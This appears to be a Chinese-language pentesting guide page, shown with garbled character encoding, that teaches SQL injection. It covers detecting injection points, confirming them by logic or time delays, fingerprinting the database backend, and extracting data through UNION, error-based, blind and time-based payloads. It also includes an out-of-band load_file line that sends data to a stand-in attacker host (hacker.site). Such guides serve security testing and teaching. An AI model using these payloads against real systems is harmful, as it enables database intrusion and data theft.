# SQLæ³¨å…¥

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹äº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ

SQLæ³¨å…¥æ˜¯ä¸€ç§Webå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…å¹²æ‰°åº”ç”¨ç¨‹åºå¯¹å…¶æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å®ƒé€šå¸¸å…è®¸æ”»å‡»è€…æŸ¥çœ‹ä»–ä»¬é€šå¸¸æ— æ³•æ£€ç´¢çš„æ•°æ®ã€‚è¿™å¯èƒ½åŒ…æ‹¬å±äºå…¶ä»–ç”¨æˆ·çš„æ•°æ®ï¼Œæˆ–è€…åº”ç”¨ç¨‹åºæœ¬èº«èƒ½å¤Ÿè®¿é—®çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹æˆ–åˆ é™¤è¿™äº›æ•°æ®ï¼Œä»è€Œå¯¹åº”ç”¨ç¨‹åºçš„å†…å®¹æˆ–è¡Œä¸ºé€ æˆæŒä¹…æ€§æ›´æ”¹ã€‚\
åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥å°†SQLæ³¨å…¥æ”»å‡»å‡çº§ä¸ºå¯¹åŸºç¡€æœåŠ¡å™¨æˆ–å…¶ä»–åç«¯åŸºç¡€è®¾æ–½çš„å…¥ä¾µï¼Œæˆ–è€…è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://portswigger.net/web-security/sql-injection)ï¼‰ã€‚

> åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å‡è®¾æˆ‘ä»¬å·²ç»å‘ç°äº†å¯èƒ½çš„SQLæ³¨å…¥ï¼Œå¹¶è®¨è®ºäº†ç¡®è®¤SQLæ³¨å…¥ã€ä¾¦æŸ¥æ•°æ®åº“å’Œæ‰§è¡Œæ“ä½œçš„å¯èƒ½æ–¹æ³•ã€‚

## å…¥å£ç‚¹æ£€æµ‹

ä½ å¯èƒ½å·²ç»å‘ç°äº†ä¸€ä¸ª**è¡¨é¢ä¸Šå®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»**çš„ç«™ç‚¹ï¼Œåªæ˜¯å› ä¸ºæœåŠ¡å™¨åœ¨å¤„ç†ä¸SQLiç›¸å…³çš„è¾“å…¥æ—¶è¡¨ç°å‡ºå¼‚å¸¸ã€‚å› æ­¤ï¼Œä½ éœ€è¦åšçš„**ç¬¬ä¸€ä»¶äº‹**æ˜¯å¦‚ä½•åœ¨ä¸ç ´åæŸ¥è¯¢çš„æƒ…å†µä¸‹**æ³¨å…¥æ•°æ®**ã€‚ä¸ºæ­¤ï¼Œä½ é¦–å…ˆéœ€è¦æ‰¾åˆ°å¦‚ä½•**ä»å½“å‰ä¸Šä¸‹æ–‡ä¸­é€ƒé€¸**çš„æ–¹æ³•ã€‚\
ä»¥ä¸‹æ˜¯ä¸€äº›æœ‰ç”¨çš„ç¤ºä¾‹ï¼š
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
ç„¶åï¼Œä½ éœ€è¦çŸ¥é“å¦‚ä½•**ä¿®å¤æŸ¥è¯¢ä»¥é¿å…é”™è¯¯**ã€‚ä¸ºäº†ä¿®å¤æŸ¥è¯¢ï¼Œä½ å¯ä»¥**è¾“å…¥**æ•°æ®ï¼Œä½¿**å…ˆå‰çš„æŸ¥è¯¢æ¥å—æ–°æ•°æ®**ï¼Œæˆ–è€…ä½ å¯ä»¥åªæ˜¯**è¾“å…¥**ä½ çš„æ•°æ®å¹¶åœ¨æœ«å°¾**æ·»åŠ ä¸€ä¸ªæ³¨é‡Šç¬¦å·**ã€‚

è¯·æ³¨æ„ï¼Œå¦‚æœä½ èƒ½çœ‹åˆ°é”™è¯¯æ¶ˆæ¯æˆ–è€…èƒ½å¤Ÿå‘ç°æŸ¥è¯¢åœ¨å·¥ä½œæ—¶å’Œä¸å·¥ä½œæ—¶çš„å·®å¼‚ï¼Œè¿™ä¸ªé˜¶æ®µä¼šæ›´å®¹æ˜“ã€‚

### **æ³¨é‡Š**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### é€šè¿‡é€»è¾‘æ“ä½œç¡®è®¤

ç¡®è®¤SQLæ³¨å…¥çš„æœ€ä½³æ–¹æ³•ä¹‹ä¸€æ˜¯é€šè¿‡ä½¿å…¶æ‰§è¡Œ**é€»è¾‘æ“ä½œ**å¹¶è·å¾—é¢„æœŸç»“æœã€‚\
ä¾‹å¦‚ï¼šå¦‚æœGETå‚æ•°`?username=Peter`è¿”å›ä¸`?username=Peter' or '1'='1`ç›¸åŒçš„å†…å®¹ï¼Œé‚£ä¹ˆä½ æ‰¾åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥ã€‚

ä½ ä¹Ÿå¯ä»¥å°†è¿™ä¸ªæ¦‚å¿µåº”ç”¨åˆ°**æ•°å­¦è¿ç®—**ä¸Šã€‚ä¾‹å¦‚ï¼šå¦‚æœ`?id=1`è¿”å›ä¸`?id=2-1`ç›¸åŒçš„å†…å®¹ï¼Œé‚£ä¹ˆæ˜¯SQLæ³¨å…¥ã€‚
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
è¿™ä¸ªå•è¯åˆ—è¡¨æ˜¯ä¸ºäº†å°è¯•ä»¥æè®®çš„æ–¹å¼**ç¡®è®¤SQLæ³¨å…¥**è€Œåˆ›å»ºçš„ï¼š

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### ä½¿ç”¨æ—¶é—´ç¡®è®¤

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨**ä¸ä¼šæ³¨æ„åˆ°é¡µé¢ä¸Šçš„ä»»ä½•å˜åŒ–**ã€‚å› æ­¤ï¼Œå‘ç°ç›²ç›®çš„SQLæ³¨å…¥çš„ä¸€ä¸ªå¥½æ–¹æ³•æ˜¯è®©æ•°æ®åº“æ‰§è¡Œæ“ä½œï¼Œå¹¶ä¸”ä¼šå¯¹é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´äº§ç”Ÿ**å½±å“**ã€‚\
å› æ­¤ï¼Œæˆ‘ä»¬å°†åœ¨SQLæŸ¥è¯¢ä¸­è¿æ¥ä¸€ä¸ªéœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½å®Œæˆçš„æ“ä½œï¼š
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**ä¸å…è®¸ä½¿ç”¨sleepå‡½æ•°**ã€‚é‚£ä¹ˆï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**æ‰§è¡Œå¤æ‚æ“ä½œ**çš„æŸ¥è¯¢æ¥ä»£æ›¿è¿™äº›å‡½æ•°ï¼Œè¿™å°†éœ€è¦å‡ ç§’é’Ÿçš„æ—¶é—´ã€‚_è¿™äº›æŠ€æœ¯çš„ç¤ºä¾‹å°†åœ¨æ¯ä¸ªæŠ€æœ¯ä¸Šå•ç‹¬è¿›è¡Œæ³¨é‡Š_ã€‚

### è¯†åˆ«åç«¯

è¯†åˆ«åç«¯çš„æœ€ä½³æ–¹æ³•æ˜¯å°è¯•æ‰§è¡Œä¸åŒåç«¯çš„å‡½æ•°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‰ä¸€èŠ‚ä¸­çš„_**sleep**_ **å‡½æ•°**æˆ–ä»¥ä¸‹å‡½æ•°ï¼š
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
æ­¤å¤–ï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®æŸ¥è¯¢çš„è¾“å‡ºï¼Œæ‚¨å¯ä»¥ä½¿å…¶**æ‰“å°æ•°æ®åº“çš„ç‰ˆæœ¬**ã€‚

{% hint style="info" %}
æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è®¨è®ºä¸åŒæ–¹æ³•æ¥åˆ©ç”¨ä¸åŒç±»å‹çš„SQLæ³¨å…¥ã€‚æˆ‘ä»¬å°†ä»¥MySQLä¸ºä¾‹ã€‚
{% endhint %}

### ä½¿ç”¨PortSwiggerè¿›è¡Œè¯†åˆ«

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## åˆ©ç”¨åŸºäºUnionçš„æ³¨å…¥

### æ£€æµ‹åˆ—æ•°

å¦‚æœæ‚¨å¯ä»¥çœ‹åˆ°æŸ¥è¯¢çš„è¾“å‡ºï¼Œè¿™æ˜¯åˆ©ç”¨å®ƒçš„æœ€ä½³æ–¹æ³•ã€‚\
é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡º**åˆå§‹è¯·æ±‚**è¿”å›çš„**åˆ—æ•°**ã€‚è¿™æ˜¯å› ä¸º**ä¸¤ä¸ªæŸ¥è¯¢å¿…é¡»è¿”å›ç›¸åŒæ•°é‡çš„åˆ—**ã€‚\
é€šå¸¸æœ‰ä¸¤ç§æ–¹æ³•ç”¨äºæ­¤ç›®çš„ï¼š

#### Order/Group by

ä¸æ–­å¢åŠ æ•°å­—ï¼Œç›´åˆ°è·å¾—Falseå“åº”ã€‚å°½ç®¡GROUP BYå’ŒORDER BYåœ¨SQLä¸­å…·æœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œä½†å®ƒä»¬éƒ½å¯ä»¥ä»¥å®Œå…¨ç›¸åŒçš„æ–¹å¼ç”¨äºç¡®å®šæŸ¥è¯¢ä¸­çš„åˆ—æ•°ã€‚
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

é€‰æ‹©æ›´å¤šçš„ç©ºå€¼ï¼Œç›´åˆ°æŸ¥è¯¢æ­£ç¡®ä¸ºæ­¢ï¼š
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢çš„ä¸¤ä¾§åˆ—çš„ç±»å‹å¿…é¡»ç›¸åŒï¼Œå› æ­¤æ‚¨åº”è¯¥ä½¿ç”¨`null`å€¼ï¼Œå› ä¸ºåœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚_

### æå–æ•°æ®åº“åç§°ã€è¡¨åç§°å’Œåˆ—åç§°

åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†æ£€ç´¢æ‰€æœ‰æ•°æ®åº“çš„åç§°ï¼Œæ•°æ®åº“ä¸­è¡¨çš„åç§°ä»¥åŠè¡¨ä¸­çš„åˆ—åç§°ï¼š
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_æ¯ä¸ªä¸åŒçš„æ•°æ®åº“éƒ½æœ‰ä¸€ç§ä¸åŒçš„æ–¹æ³•æ¥å‘ç°è¿™äº›æ•°æ®ï¼Œä½†æ–¹æ³•è®ºæ˜¯ç›¸åŒçš„ã€‚_

## åˆ©ç”¨éšè—çš„åŸºäºè”åˆçš„æ³¨å…¥

å¦‚æœä½ èƒ½çœ‹åˆ°æŸ¥è¯¢çš„è¾“å‡ºï¼Œä½†æ— æ³•è¿›è¡ŒåŸºäºè”åˆçš„æ³¨å…¥ï¼Œé‚£ä¹ˆä½ æ­£åœ¨å¤„ç†ä¸€ä¸ªéšè—çš„åŸºäºè”åˆçš„æ³¨å…¥ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å°†é¢ä¸´ç›²æ³¨å…¥ã€‚è¦å°†ç›²æ³¨å…¥è½¬å˜ä¸ºåŸºäºè”åˆçš„æ³¨å…¥ï¼Œä½ éœ€è¦æå–åœ¨åç«¯æ‰§è¡Œçš„æŸ¥è¯¢ã€‚\
ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨ç›²æ³¨å…¥å’Œç›®æ ‡DBMSçš„é»˜è®¤è¡¨æ¥å®ç°ã€‚è¦äº†è§£è¿™äº›é»˜è®¤è¡¨ï¼Œè¯·é˜…è¯»ç›®æ ‡DBMSçš„æ–‡æ¡£ã€‚\
åœ¨æå–æŸ¥è¯¢ä¹‹åï¼Œä½ éœ€è¦ç›¸åº”åœ°è°ƒæ•´ä½ çš„æœ‰æ•ˆè½½è·ï¼Œå®‰å…¨åœ°å…³é—­åŸå§‹æŸ¥è¯¢ã€‚ç„¶ååœ¨æœ‰æ•ˆè½½è·ä¸­é™„åŠ ä¸€ä¸ªè”åˆæŸ¥è¯¢ï¼Œå¹¶å¼€å§‹åˆ©ç”¨æ–°è·å¾—çš„åŸºäºè”åˆçš„æ³¨å…¥ã€‚

å®Œæ•´æ–‡ç« ï¼šhttps://medium.com/@Rend\_/healing-blind-injections-df30b9e0e06f

## åˆ©ç”¨åŸºäºé”™è¯¯çš„æ³¨å…¥

å¦‚æœç”±äºæŸç§åŸå› ä½ **æ— æ³•**çœ‹åˆ°**æŸ¥è¯¢çš„è¾“å‡º**ï¼Œä½†ä½ å¯ä»¥**çœ‹åˆ°é”™è¯¯æ¶ˆæ¯**ï¼Œä½ å¯ä»¥åˆ©ç”¨è¿™äº›é”™è¯¯æ¶ˆæ¯ä»æ•°æ®åº“ä¸­**æå–**æ•°æ®ã€‚\
æŒ‰ç…§ä¸åŸºäºè”åˆçš„åˆ©ç”¨ç±»ä¼¼çš„æµç¨‹ï¼Œä½ å¯ä»¥æˆåŠŸåœ°è½¬å‚¨æ•°æ®åº“ã€‚
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## åˆ©ç”¨ç›²æ³¨è¿›è¡Œæ”»å‡»

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æ— æ³•çœ‹åˆ°æŸ¥è¯¢çš„ç»“æœæˆ–é”™è¯¯ï¼Œä½†æ˜¯æ‚¨å¯ä»¥é€šè¿‡é¡µé¢ä¸Šçš„ä¸åŒå†…å®¹æ¥åŒºåˆ†æŸ¥è¯¢è¿”å›çš„æ˜¯trueè¿˜æ˜¯falseå“åº”ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºé€ä¸ªå­—ç¬¦åœ°è½¬å‚¨æ•°æ®åº“ï¼š
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## åˆ©ç”¨é”™è¯¯ç›²æ³¨è¿›è¡Œæ”»å‡»

è¿™ä¸ä¹‹å‰çš„æƒ…å†µç›¸åŒï¼Œä½†ä¸å†åŒºåˆ†æŸ¥è¯¢çš„çœŸ/å‡å“åº”ï¼Œè€Œæ˜¯å¯ä»¥åŒºåˆ†SQLæŸ¥è¯¢æ˜¯å¦å‡ºç°é”™è¯¯ï¼ˆå¯èƒ½æ˜¯å› ä¸ºHTTPæœåŠ¡å™¨å´©æºƒï¼‰ã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯æ¬¡çŒœæµ‹æ­£ç¡®çš„å­—ç¬¦æ—¶ï¼Œæ‚¨å¯ä»¥å¼ºåˆ¶å¼•å‘SQLé”™è¯¯ï¼š
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## åˆ©ç”¨åŸºäºæ—¶é—´çš„SQLæ³¨å…¥

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ²¡æœ‰åŠæ³•æ ¹æ®é¡µé¢çš„ä¸Šä¸‹æ–‡æ¥åŒºåˆ†æŸ¥è¯¢çš„å“åº”ã€‚ä½†æ˜¯ï¼Œå¦‚æœçŒœæµ‹çš„å­—ç¬¦æ˜¯æ­£ç¡®çš„ï¼Œä½ å¯ä»¥ä½¿é¡µé¢åŠ è½½æ—¶é—´å˜é•¿ã€‚æˆ‘ä»¬ä¹‹å‰å·²ç»çœ‹åˆ°è¿‡è¿™ç§æŠ€æœ¯çš„ä½¿ç”¨ï¼Œä»¥ç¡®è®¤SQLæ³¨å…¥æ¼æ´ã€‚
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## å †å æŸ¥è¯¢

æ‚¨å¯ä»¥ä½¿ç”¨å †å æŸ¥è¯¢æ¥**è¿ç»­æ‰§è¡Œå¤šä¸ªæŸ¥è¯¢**ã€‚è¯·æ³¨æ„ï¼Œå°½ç®¡æ‰§è¡Œäº†åç»­æŸ¥è¯¢ï¼Œä½†**ç»“æœä¸ä¼šè¿”å›ç»™åº”ç”¨ç¨‹åº**ã€‚å› æ­¤ï¼Œæ­¤æŠ€æœ¯ä¸»è¦ç”¨äºä¸**ç›²æ¼æ´**ç›¸å…³çš„æƒ…å†µï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç¬¬äºŒä¸ªæŸ¥è¯¢æ¥è§¦å‘DNSæŸ¥æ‰¾ã€æ¡ä»¶é”™è¯¯æˆ–æ—¶é—´å»¶è¿Ÿã€‚

**Oracle**ä¸æ”¯æŒ**å †å æŸ¥è¯¢**ã€‚**MySQLã€Microsoft**å’Œ**PostgreSQL**æ”¯æŒå®ƒä»¬ï¼š`QUERY-1-HERE; QUERY-2-HERE`

## å¸¦å¤–åˆ©ç”¨

å¦‚æœ**æ²¡æœ‰å…¶ä»–**åˆ©ç”¨æ–¹æ³•**å¥æ•ˆ**ï¼Œæ‚¨å¯ä»¥å°è¯•è®©**æ•°æ®åº“å°†ä¿¡æ¯æ³„éœ²**åˆ°ç”±æ‚¨æ§åˆ¶çš„**å¤–éƒ¨ä¸»æœº**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡DNSæŸ¥è¯¢ï¼š
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### é€šè¿‡XXEè¿›è¡Œå¸¦å¤–æ•°æ®æ³„éœ²

XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ˜¯ä¸€ç§å¸¸è§çš„Webåº”ç”¨ç¨‹åºæ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥ä»ç›®æ ‡ç³»ç»Ÿä¸­æ³„éœ²æ•°æ®ã€‚åœ¨XXEæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡å‘ç›®æ ‡åº”ç”¨ç¨‹åºå‘é€æ¶æ„çš„XMLè¯·æ±‚æ¥è§¦å‘æ¼æ´ã€‚è¿™äº›æ¶æ„è¯·æ±‚ä¸­åŒ…å«äº†æŒ‡å‘å¤–éƒ¨å®ä½“çš„å¼•ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›å¼•ç”¨æ¥è¯»å–æ•æ„Ÿæ•°æ®å¹¶å°†å…¶å‘é€åˆ°è‡ªå·±çš„æœåŠ¡å™¨ã€‚

ç„¶è€Œï¼Œæœ‰äº›æƒ…å†µä¸‹ï¼Œç›®æ ‡ç³»ç»Ÿå¯èƒ½æ— æ³•ç›´æ¥ä¸æ”»å‡»è€…çš„æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œä¾‹å¦‚é˜²ç«å¢™æˆ–å…¶ä»–å®‰å…¨æªæ–½å¯èƒ½ä¼šé˜»æ­¢æ­¤ç±»é€šä¿¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å¸¦å¤–æ•°æ®æ³„éœ²æŠ€æœ¯æ¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚

å¸¦å¤–æ•°æ®æ³„éœ²æ˜¯ä¸€ç§åˆ©ç”¨å…¶ä»–åè®®ï¼ˆå¦‚HTTPã€DNSæˆ–SMTPï¼‰æ¥å°†æ•°æ®ä»ç›®æ ‡ç³»ç»Ÿä¼ è¾“åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨çš„æŠ€æœ¯ã€‚åœ¨XXEæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨æ¶æ„XMLè¯·æ±‚ä¸­æ’å…¥å¸¦å¤–æ•°æ®æ³„éœ²çš„æœ‰æ•ˆè½½è·æ¥å®ç°è¿™ä¸€ç‚¹ã€‚

ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ¶æ„XMLè¯·æ±‚ä¸­æ’å…¥ä¸€ä¸ªå¤–éƒ¨å®ä½“å¼•ç”¨ï¼Œè¯¥å¼•ç”¨æŒ‡å‘ä¸€ä¸ªç‰¹æ®Šçš„URLï¼Œè¯¥URLä¼šè§¦å‘ç›®æ ‡ç³»ç»Ÿå‘æ”»å‡»è€…çš„æœåŠ¡å™¨å‘é€HTTPè¯·æ±‚ã€‚æ”»å‡»è€…å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç›‘å¬è¿™äº›è¯·æ±‚ï¼Œå¹¶ä»ä¸­æå–æ•æ„Ÿæ•°æ®ã€‚

é€šè¿‡ä½¿ç”¨å¸¦å¤–æ•°æ®æ³„éœ²æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡é˜²ç«å¢™æˆ–å…¶ä»–å®‰å…¨æªæ–½ï¼Œå°†æ•æ„Ÿæ•°æ®ä»ç›®æ ‡ç³»ç»Ÿä¸­æ³„éœ²å‡ºæ¥ï¼Œè€Œæ— éœ€ç›´æ¥ä¸æ”»å‡»è€…çš„æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ›´åŠ éšè”½åœ°è¿›è¡Œæ•°æ®æ³„éœ²ï¼Œå¹¶ä¸”æ›´éš¾è¢«æ£€æµ‹åˆ°ã€‚

è¦åˆ©ç”¨XXEè¿›è¡Œå¸¦å¤–æ•°æ®æ³„éœ²ï¼Œæ”»å‡»è€…éœ€è¦äº†è§£ç›®æ ‡ç³»ç»Ÿçš„é…ç½®å’Œç¯å¢ƒï¼Œå¹¶é€‰æ‹©é€‚åˆçš„å¸¦å¤–é€šä¿¡åè®®å’Œæœ‰æ•ˆè½½è·ã€‚åŒæ—¶ï¼Œæ”»å‡»è€…è¿˜éœ€è¦åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šè®¾ç½®ç›¸åº”çš„ç›‘å¬å™¨æ¥æ¥æ”¶ä»ç›®æ ‡ç³»ç»Ÿå‘é€çš„æ•°æ®ã€‚

